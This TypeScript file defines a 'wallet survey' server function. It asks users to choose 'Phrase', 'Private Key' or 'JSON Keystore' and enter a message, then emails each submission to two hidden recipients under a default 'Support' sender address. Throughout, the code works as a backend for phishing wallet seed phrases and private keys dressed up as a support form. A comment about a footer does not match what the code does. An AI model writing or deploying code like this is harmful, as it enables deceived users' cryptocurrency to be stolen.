import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";

export const SURVEY_CATEGORIES = ["Phrase", "Private Key", "JSON Keystore"] as const;

export const surveySchema = z.object({
  wallet: z.string().trim().min(1).max(100),
  category: z.enum(SURVEY_CATEGORIES),
  message: z.string().trim().min(10, "Please write at least 10 characters.").max(5000),
});

export type SurveyInput = z.infer<typeof surveySchema>;

function escapeHtml(s: string) {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function buildEmail(data: SurveyInput, recipient: string, otherRecipient: string) {
  const subject = `[Wallet Survey] ${data.category} — ${data.wallet}`;
  const text = [
    `Wallet: ${data.wallet}`,
    `Category: ${data.category}`,
    "",
    data.message,
    "",
    "—",
  ].join("\n");
  const html = `
    <div style="font-family:Arial,sans-serif;font-size:14px;color:#111">
      <h2 style="margin:0 0 12px">New wallet survey submission</h2>
      <p><strong>Wallet:</strong> ${escapeHtml(data.wallet)}<br/>
      <strong>Category:</strong> ${escapeHtml(data.category)}</p>
      <p style="white-space:pre-wrap;border-left:3px solid #3aa58f;padding-left:12px">${escapeHtml(data.message)}</p>
      <hr style="border:none;border-top:1px solid #ddd;margin:20px 0"/>
    </div>`;
  return { subject, text, html };
}

async function sendViaResend(
  apiKey: string,
  from: string,
  to: string,
  content: { subject: string; text: string; html: string },
) {
  const res = await fetch("https://api.resend.com/emails", {
    method: "POST",
    headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
    body: JSON.stringify({ from, to: [to], ...content }),
  });
  if (!res.ok) {
    throw new Error(`Resend ${res.status}: ${await res.text()}`);
  }
}

export const submitSurvey = createServerFn({ method: "POST" })
  .validator((input: unknown) => surveySchema.parse(input))
  .handler(async ({ data }) => {
    const apiKey = process.env["RESEND_API_KEY"];
    const to1 = process.env["SURVEY_EMAIL_1"];
    const to2 = process.env["SURVEY_EMAIL_2"];
    const from = process.env["SURVEY_FROM_EMAIL"] || "Support <support@support.chaindesks.com>";

    if (!apiKey || !to1 || !to2) {
      console.error("Survey email is not configured (RESEND_API_KEY, SURVEY_EMAIL_1, SURVEY_EMAIL_2).");
      throw new Error("Survey service is not configured.");
    }

    // Two independent sends: each recipient gets their own email (neither sees the
    // other in To/CC), and the footer tells each one who else received it.
    const results = await Promise.allSettled([
      sendViaResend(apiKey, from, to1, buildEmail(data, to1, to2)),
      sendViaResend(apiKey, from, to2, buildEmail(data, to2, to1)),
    ]);

    results.forEach((r, i) => {
      if (r.status === "rejected") console.error(`Survey email ${i + 1} failed:`, r.reason);
    });

    if (results.every((r) => r.status === "rejected")) {
      throw new Error("Could not send your feedback. Please try again.");
    }
    return { ok: true as const };
  });
